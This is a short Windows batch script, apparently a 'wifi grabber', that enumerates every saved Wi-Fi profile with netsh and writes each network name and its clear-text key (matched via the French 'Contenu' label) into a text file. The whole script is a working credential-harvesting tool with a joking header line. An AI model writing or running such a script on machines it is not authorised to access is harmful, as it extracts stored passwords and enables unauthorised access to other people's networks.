@echo off
echo Don't worry, be happy :-) > wifi_grabber.txt
FOR /F "delims=: skip=9 tokens=1,2" %%i IN ('netsh wlan show profiles') DO (
    FOR /F "tokens=*" %%a IN ('echo%%j') DO (
        echo %%a>> wifi_grabber.txt
        netsh wlan show profiles "name=%%a" key=clear | findstr Contenu >> wifi_grabber.txt
        )
)